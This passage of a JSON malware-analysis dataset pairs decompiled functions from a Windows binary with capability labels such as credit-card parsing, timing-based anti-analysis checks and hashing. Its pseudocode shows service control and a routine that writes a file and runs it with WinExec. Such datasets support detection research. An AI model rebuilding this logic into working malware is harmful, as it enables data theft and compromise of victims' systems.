        "decompiled_code": "\nvoid fcn.00402380(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00404d60;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00403d40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403d40(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00403370": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403370(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42377c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00402280(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e8, acStack1304, &uStack2112);\n    uStack2088 = 0x407370;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407388;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401bf0(auStack1564, 0x4072e4, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1867
    },
    "00403b50": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403c90) overlaps instruction at (ram,0x00403c8f)\n// \n// WARNING: Removing unreachable block (ram,0x00403bdb)\n// WARNING: Removing unreachable block (ram,0x00403ced)\n\nuint64_t __fastcall fcn.00403b50(int32_t param_1, uint param_2, uint8_t **param_3)\n\n{\n    uint32_t uVar1;\n    uint8_t **ppuVar2;\n    char cVar3;\n    uint16_t uVar4;\n    uint in_EAX;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t uVar7;\n    int32_t *piVar8;\n    uint8_t uVar9;\n    uint32_t unaff_EBX;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint8_t *unaff_ESI;\n    uint8_t *unaff_EDI;\n    uint8_t **ppuVar13;\n    ushort in_SS;\n    ushort in_DS;\n    bool in_CF;\n    bool bVar14;\n    bool bVar15;\n    uint8_t in_AF;\n    bool bVar16;\n    bool bVar17;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar18;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 in_ST0;\n    float10 extraout_ST0;\n    float10 in_ST1;\n    float10 extraout_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    ulong uVar19;\n    uint uStack36;\n    uint16_t uStack32;\n    uint8_t uStack24;\n    uchar uStack23;\n    ushort uStack22;\n    uint16_t uStack20;\n    uint16_t uStack18;\n    ushort uStack16;\n    ushort uStack14;\n    \n    uVar19 = CONCAT44(param_2, in_EAX);\n    uStack16 = SUB42(unaff_EDI, 0);\n    uStack14 = unaff_EDI >> 0x10;\n    if ((in_CF) || (!in_CF)) {\n        *param_3 = 0x7c;\n        uStack18 = param_2;\n    }\n    else {\n        param_3 = unaff_EDI + 1;\n        uVar7 = in_EAX;\n        cVar3 = uVar7 - *unaff_EDI;\n        uStack20 = (in_NT & 1) * 0x4000 | SBORROW1(uVar7, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                   (in_TF & 1) * 0x100 | (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                   ((POPCOUNT(cVar3) & 1U) == 0) * 4 | uVar7 < *unaff_EDI;\n        uStack18 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n        unaff_ESI = unaff_ESI + -1;\n        uStack24 = 0x68;\n        uStack23 = 0x3b;\n        uStack22 = 0x40;\n        uVar19 = func_0x10189ae0();\n        param_1 = unaff_EBX + 0x7c6087d;\n        uStack18 = uVar19 >> 0x20;\n        uStack16 = uVar19 >> 0x30;\n        in_ST0 = extraout_ST0;\n        in_ST1 = extraout_ST1;\n    }\n    uVar4 = uStack18;\n    puVar5 = uVar19;\n    uVar1 = uVar19 >> 0x20 & 0xffff0000;\n    *(param_3 + 1) = 0xe9;\n    uStack20 = param_1;\n    uStack18 = param_1 >> 0x10;\n    uStack24 = uVar4;\n    uVar9 = unaff_EBX >> 8;\n    bVar14 = false;\n    bVar18 = false;\n    uVar7 = uStack24 ^ uVar9 | 0x67;\n    bVar17 = uVar7 < '\\0';\n    bVar16 = uVar7 == 0;\n    bVar15 = (POPCOUNT(uVar7) & 1U) == 0;\n    piVar8 = uVar1 | uVar4;\n    *(param_3 + 2) = 0x87;\n    puVar11 = &stack0xfffffffc;\n    ppuVar13 = param_3;\n    if ((!bVar17) && (uStack18 = uVar4,  puVar11 = &stack0xfffffffc,  bVar17)) {\n        out(0xc4, puVar5);\n        uStack20 = in_DS;\n        piVar8 = uVar1 | uVar4 & 0xffffff00 | uStack24 ^ param_1;\n        ppuVar13 = param_3 + 1;\n        *param_3 = puVar5;\n        bVar14 = uVar9 < *puVar5;\n        bVar18 = SBORROW1(uVar9, *puVar5);\n        cVar3 = uVar9 - *puVar5;\n        bVar17 = cVar3 < '\\0';\n        bVar16 = cVar3 == '\\0';\n        bVar15 = (POPCOUNT(cVar3) & 1U) == 0;\n        puVar11 = &stack0xfffffffc;\n    }\n    do {\n        *(ppuVar13 + 3) = 0xeb;\n        if ((bVar18 == bVar17) && (bVar18 != bVar17)) {\n            *(puVar5 + -0x7ce92414) = in_ST0;\n            uVar7 = puVar5 + -1;\n            in_AF = 9 < (uVar7 & 0xf) | in_AF;\n            uVar7 = uVar7 + in_AF * '\\x06';\n            uVar7 = uVar7 + (0x90 < (uVar7 & 0xf0) | bVar14 | in_AF * (0xf9 < uVar7)) * '`';\n            *piVar8 = *piVar8 + 0x47c6df84;\n            bVar14 = 0xc6 < uVar7;\n            bVar18 = SCARRY1(uVar7, '9');\n            uVar7 = uVar7 + 0x39;\n            puVar5 = puVar5 + -1 & 0xffffff00 | uVar7;\n            bVar17 = uVar7 < '\\0';\n            bVar16 = uVar7 == 0;\n            bVar15 = (POPCOUNT(uVar7) & 1U) == 0;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        }\n        else {\n            *(ppuVar13 + 1) = 0x39;\n        }\n        puVar6 = puVar5;\n        if ((!bVar14 && !bVar16) && (bVar14 || bVar16)) {\n            bVar18 = false;\n            puVar6 = puVar5 & 0xe2f4cc58;\n            bVar17 = puVar6 < 0;\n            bVar16 = puVar6 == NULL;\n            bVar15 = (POPCOUNT(puVar5 & 0x58) & 1U) == 0;\n        }\n        *(ppuVar13 + 5) = 0x51;\n        puVar12 = puVar11;\n        if ((!bVar16) && (bVar16)) {\n            puVar10 = &uStack32;\n            puVar12 = &uStack32;\n            cVar3 = '\\x10';\n            do {\n                puVar11 = puVar11 + -1;\n                puVar10 = puVar10 + -1;\n                *puVar10 = *puVar11;\n                cVar3 = cVar3 + -1;\n            } while ('\\0' < cVar3);\n        }\n        *(ppuVar13 + 6) = 0xb5;\n        if ((bVar16 || bVar18 != bVar17) || (!bVar16 && bVar18 == bVar17)) {\n            *(ppuVar13 + 7) = 0x70;\n            if ((bVar15) || (!bVar15)) goto code_r0x00403c39;\ncode_r0x00403c27:\n            ppuVar2 = segment(in_SS, *0x10 + -0x1c);\n            puVar6 = *ppuVar2;\n        }\n        else {\n            in_ST0 = in_ST0 - *(puVar12 + 0x47c692c9);\n            if (bVar18) {\n                *puVar6 = *puVar6 + puVar6;\n                goto code_r0x00403c27;\n            }\n        }\n        unaff_EBX = unaff_EBX & 0xffffff00 | *unaff_ESI;\n        *puVar6 = *puVar6 + puVar6;\n        puVar6[0x66] = puVar6[0x66] + piVar8;\n        *0xf58ea42 = *0xf58ea42 + 'B';\n        ppuVar2 = ppuVar13 + 0x16;\n        uVar7 = *ppuVar2;\n        bVar18 = SCARRY1(*ppuVar2, -0x16);\n        *ppuVar2 = *ppuVar2 - 0x16;\n        bVar17 = *ppuVar2 < '\\0';\n        bVar16 = *ppuVar2 == 0;\n        piVar8 = 0xb7bc9ea5;\n        if (0x15 < uVar7) goto code_r0x00403c5a;\n        if ((POPCOUNT(*ppuVar2) & 1U) != 0) break;\n        piVar8 = 0xb7bc9ea5;\n        puVar5 = 0xf58ea42;\n        ppuVar13 = ppuVar13 + 1;\n        bVar14 = CARRY4(puVar12, unaff_EBX);\n        bVar18 = SCARRY4(puVar12, unaff_EBX);\n        puVar11 = puVar12 + unaff_EBX;\n        bVar17 = puVar11 < 0;\n        bVar16 = puVar11 == NULL;\n        bVar15 = (POPCOUNT(puVar11 & 0xff) & 1U) == 0;\n    } while( true );\n    bVar18 = false;\n    bVar17 = &uStack24 < 0;\n    bVar16 = *0x10 == 0x18;\n    bVar15 = (POPCOUNT(&uStack24 & 0xff) & 1U) == 0;\n    puVar6 = 0xffffea42;\ncode_r0x00403c39:\n    *(ppuVar13 + 2) = 0xb8;\n    if ((bVar15) || (!bVar15)) {\n        *(ppuVar13 + 9) = 0xea;\n    }\n    else {\n        puVar12 = *0xc617b43a;\n        ppuVar13 = ppuVar13 + 1;\n        bVar18 = false;\n        piVar8 = puVar6 | puVar12;\n        bVar17 = piVar8 < 0;\n        bVar16 = piVar8 == NULL;\n    }\n    if (!bVar16 && bVar18 == bVar17) {\ncode_r0x00403c5a:\n        if (bVar16 || bVar18 != bVar17) goto code_r0x00403c6a;\n    }\n    *(ppuVar13 + 10) = 0xe3;\ncode_r0x00403c6a:\n    *(ppuVar13 + 0xb) = 0x3a;\n    *(ppuVar13 + 3) = 0xa5;\n    *(puVar12[2] + 0xd) = 0x84;\n    uVar1 = puVar12[2];\n    *(uVar1 + 0xe) = 0x33;\n    uStack32 = piVar8;\n    bVar14 = (uVar1 & 0x11cb) == 0;\n    *(uVar1 + 0xf) = 0x2a;\n    *(uVar1 + 0x10) = 0x6a;\n    if ((!bVar14) && (bVar14)) {\n        uVar7 = 9 < (uVar1 & 0xf) | in_AF;\n        uVar9 = uVar1 + uVar7 * '\\x06';\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        return CONCAT44(piVar8 & 0xffff0000 | uStack32 & 0xff | (piVar8 >> 8 | uVar9 & 0xf) << 8, \n                        (uVar1 & 0xffff0000 | CONCAT11((uVar1 >> 8) + uVar7, uVar9) & 0xff0f) + 1) | 0xf7666084;\n    }\n    *(uVar1 + 0x11) = 0xad;\n    puVar11 = puVar12;\n    if ((!bVar14) && (bVar14)) {\n        puVar10 = &uStack32;\n        puVar11 = &uStack32;\n        cVar3 = '\\x10';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar12;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n    }\n    *puVar11[3] = 0x12;\n    return CONCAT44(piVar8, uVar1);\n}\n",
        "token_count": 3297
    },
    "004049a0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a30) overlaps instruction at (ram,0x00404a2c)\n// \n// WARNING: Removing unreachable block (ram,0x00404a21)\n// WARNING: Removing unreachable block (ram,0x00404a23)\n\nint32_t __fastcall fcn.004049a0(uint32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    bool bVar1;\n    uint16_t *puVar2;\n    uchar *puVar3;\n    int32_t unaff_ESI;\n    int32_t iVar4;\n    bool in_CF;\n    \n    puVar3 = &stack0xfffffffc;\n    if ((!in_CF) && (puVar3 = &stack0xfffffffc,  in_CF)) {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8b27e95e;\n        *(param_2 + 0x66) = *(param_2 + 0x66) | param_2;\n        param_3 = param_1;\n        puVar3 = &stack0xfffffffb;\n    }\n    puVar2 = *(puVar3 + 0xc);\n    for (iVar4 = *(puVar3 + 0x10); bVar1 = iVar4 == 0,  !bVar1; iVar4 = iVar4 + -1) {\n        if ((!bVar1) && (bVar1)) {\n            iVar4 = 0 + 1;\n            out(pe_dos_header, puVar2);\n        }\n        param_3 = param_3 + *puVar2;\n        if (param_3 >> 0x10 != 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            param_3 = (param_3 >> 0x10) + (param_3 & 0xffff);\n        }\n        puVar2 = puVar2 + 1;\n    }\n    return (param_3 >> 0x10) + param_3;\n}\n",
        "token_count": 474
    },
    "00401240": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401240(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4051a0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073fc);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407408);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &var_18h);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x40741c);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00401661:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x0040166d:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00401628:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x0040166d;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00401464:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00401040(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x407430);\n                        if (iVar1 != 0) goto joined_r0x00401464;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x0040160d:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00401661;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x0040160d;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00401040(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00401180(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00401628;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2448
    },
    "00401ac0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401bcd) overlaps instruction at (ram,0x00401bcb)\n// \n// WARNING: Removing unreachable block (ram,0x00401ba0)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x00401bcd)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401ac0(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint8_t uVar7;\n    uint32_t unaff_ESI;\n    char **unaff_EDI;\n    uint8_t in_AF;\n    bool bVar8;\n    bool bVar9;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        uVar5 = arg_14h;\n        do {\n            bVar8 = (unaff_ESI & (uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + '\\x01', uVar5))) < 0;\n            if ((bVar8) || (uVar5 = var_8h,  !bVar8)) {\n                uVar5 = var_ch;\n            }\n            uVar1 = *((uVar5 + 0xf4458b2f) % arg_ch + arg_8h);\n            puVar6 = (var_ch - 1) % arg_ch;\n            bVar9 = false;\n            uVar3 = *(var_8h + arg_10h) ^ *(puVar6 + arg_8h);\n            pcVar4 = (var_ch - 1) / arg_ch & 0xffffff00U | uVar3;\n            bVar8 = uVar3 < '\\0';\n            if ((bVar8) || (!bVar8)) {\n                if (!bVar8) goto code_r0x00401b84;\n            }\n            else {\n                *(pcVar4 + -0x7ce92414) = in_ST0;\n                uVar3 = pcVar4 + -1;\n                in_AF = 9 < (uVar3 & 0xf) | in_AF;\n                uVar3 = uVar3 + in_AF * '\\x06';\n                piVar2 = pcVar4 + -1 & 0xffffff00 | uVar3 + (0x90 < (uVar3 & 0xf0) | in_AF * (0xf9 < uVar3)) * '`';\n                uVar5 = *puVar6;\n                *puVar6 = *puVar6 + 0x8c0fdf84;\n                pcVar4 = 